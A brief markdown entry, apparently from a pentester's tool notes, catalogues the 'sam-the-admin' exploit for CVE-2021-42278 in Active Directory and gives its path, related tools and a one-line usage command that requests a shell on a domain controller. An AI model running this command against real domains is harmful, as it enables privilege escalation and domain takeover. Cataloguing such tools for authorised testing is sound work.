---
tags: [tool, activedirectory, exploit]
tool: "sam-the-admin"
category: "Active Directory"
installed: true
phase: [exploitation]
---

# sam-the-admin - CVE-2021-42278 Exploit

## Tool Overview
Purpose: Exploit samAccountName spoofing
Location: ~/tools/activedirectory/sam-the-admin/sam_the_admin.py

## How to Use It
python3 sam_the_admin.py domain.local/user:pass -dc-ip dc -shell

## Related Tools
nopac, zerologon
